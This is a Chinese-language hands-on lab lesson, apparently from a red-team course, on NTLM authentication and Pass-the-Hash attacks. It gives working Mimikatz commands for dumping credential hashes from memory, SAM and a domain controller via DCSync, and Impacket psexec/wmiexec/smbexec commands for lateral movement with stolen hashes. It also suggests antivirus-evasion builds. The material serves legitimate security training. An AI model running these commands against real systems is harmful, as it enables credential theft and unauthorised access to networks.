## ⚔️ 实战任务（先动手！）

### 任务 1：理解 NTLM 认证（20 分钟）

**NTLM 认证流程**：

```
客户端                    服务端
   │                        │
   │ ─────── 用户名 ───────→│
   │                        │
   │ ←────── Challenge ─────│  (随机数)
   │                        │
   │ ─────── Response ─────→│  (Hash 加密 Challenge)
   │                        │
   │     服务端验证 Response  │
   │     (用本地 Hash 计算)  │
```

**关键点**：服务端只验证 Response，不需要知道明文密码！

---

### 任务 2：使用 Mimikatz 提取 Hash（40 分钟）

**在已控制的 Windows 机器上（需要管理员权限）**：

```cmd
:: 运行 Mimikatz
mimikatz.exe

:: 获取调试权限
privilege::debug

:: 导出内存中的 Hash
sekurlsa::logonpasswords

:: 导出 SAM 数据库 Hash
lsadump::sam

:: 导出域控 Hash（需要域管权限）
lsadump::dcsync /user:administrator
```

**预期输出**：
```
Authentication Id : 0 ; 12345678
Session           : Interactive
User Name         : Administrator
Domain            : CORP
NTLM              : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### 任务 3：使用 Mimikatz PTH（30 分钟）

```cmd
:: 使用 Hash 打开新的 cmd
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0

:: 在新窗口中执行命令
dir \\dc01\c$
psexec \\dc01 cmd
```

### 任务 4：使用 Impacket PTH（30 分钟）

**在 Kali 上通过代理执行**：

```bash
# 使用 psexec
proxychains4 impacket-psexec CORP/Administrator@10.0.0.100 -hashes aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# 使用 wmiexec
proxychains4 impacket-wmiexec CORP/Administrator@10.0.0.100 -hashes aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# 使用 smbexec
proxychains4 impacket-smbexec CORP/Administrator@10.0.0.100 -hashes aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

## 📖 底层补课（做完实验再看）

### 为什么 PTH 能成功？

NTLM 认证设计缺陷：
1. 服务端存储 Hash，不是明文
2. 认证只需要证明「你有 Hash」
3. 不需要证明「你知道密码」

### NTLM Hash 格式

```
LM Hash : NT Hash
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
         ↑                              ↑
    通常为空值                      这个才重要
```

### PTH 工具对比

| 工具 | 优点 | 缺点 |
|------|------|------|
| Mimikatz PTH | 原生 Windows | 需要上传到目标 |
| Impacket | Linux 原生 | 需要代理 |
| CrackMapExec | 批量操作 | 功能相对简单 |
| Evil-WinRM | 走 WinRM | 需要 5985 端口 |

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| Hash 格式错误 | 认证失败 | 确认是 LM:NT 格式 |
| 权限不足 | 无法 dump | 需要本地管理员权限 |
| 端口被封 | 连接超时 | 尝试不同工具（445/135/5985） |
| AV 拦截 | Mimikatz 被杀 | 用免杀版本或内存执行 |

## 💡 知识卡片速查

### Mimikatz 常用命令

| 命令 | 作用 |
|------|------|
| `privilege::debug` | 获取调试权限 |
| `sekurlsa::logonpasswords` | 导出登录凭据 |
| `lsadump::sam` | 导出 SAM |
| `lsadump::dcsync` | 从 DC 同步 Hash |
| `sekurlsa::pth` | Pass the Hash |

### Hash 来源

| 来源 | 说明 |
|------|------|
| lsass.exe 内存 | 登录用户的 Hash |
| SAM 数据库 | 本地用户 Hash |
| NTDS.dit | 域所有用户 Hash |
| 缓存凭据 | DCC2 格式 |

## ❓ 常见问题

**Q1：PTH 和密码爆破有什么区别？**

A1：PTH 直接用 Hash 认证，不需要还原密码；密码爆破需要猜测明文。

**Q2：抓到的 Hash 怎么破解？**

A2：可以用 hashcat 或 john 破解，但 PTH 通常更快更直接。

**Q3：所有 Windows 都能 PTH 吗？**

A3：默认可以。但如果启用了「禁用 NTLM」或使用 Kerberos Only，PTH 会失败。
